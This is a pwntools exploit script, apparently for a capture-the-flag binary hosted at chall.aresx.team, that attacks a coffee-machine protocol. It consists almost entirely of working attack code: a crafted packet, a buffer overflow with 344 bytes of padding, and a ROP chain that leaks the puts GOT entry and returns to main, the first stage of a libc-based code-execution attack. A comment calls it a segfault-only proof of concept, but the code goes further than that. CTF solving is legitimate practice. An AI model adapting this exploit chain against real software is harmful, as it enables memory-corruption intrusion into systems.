#!/usr/bin/python3

from pwn import *
import base64

elf = context.binary = ELF('./chal')
libc = elf.libc

local = True

if local:
    p = elf.process()
else:
    host = 'chall.aresx.team'
    port = 1016
    p = remote(host,port)

if args.GDB:
    gdb.attach(p,gdbscript=f'''
        #b *verify_checksum
        #b *main
        continue
    ''')

"""
> Action
    1 -> Reboot
    2 -> Make Coffee
    3 -> Shutdown

> Type
    0 -> Espresso
    1 -> Testcase

> Size
    0 -> Small
    1 -> Medium
    2 -> Large
    d -> None
"""

# THIS EXPLOIT POC IS JUST SUPPOSED TO CAUSE A SEGFAULT

payload1 =  p32(0x1337)     # Magic
payload1 += p32(0x2)        # Action (Make coffee)
payload1 += p32(0x1)        # Length
payload1 += base64.b64encode(b"password\0")   # Key

p.sendline(payload1)

rop = ROP([elf])
PUTS_PLT = p64(elf.plt['puts'])
PUTS_GOT = p64(elf.got['puts'])
pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
main = p64(elf.sym['main'])
ropchain1 = pop_rdi + PUTS_GOT + PUTS_PLT + main

payload2 =  p32(0x1337)     # Magic
payload2 += p32(0x20)       # Temperature
payload2 += p32(0x1)        # Type
payload2 += p32(0x2)        # cup_size
payload2 += p32(500)        # length
payload2 += b"A"*344        # padding
payload2 += ropchain1       # ropchain
payload2 += b"C"*(500-344-len(ropchain1))
payload2 += p32(0x41*500)   # Checksum

p.sendline(payload2)

p.interactive()
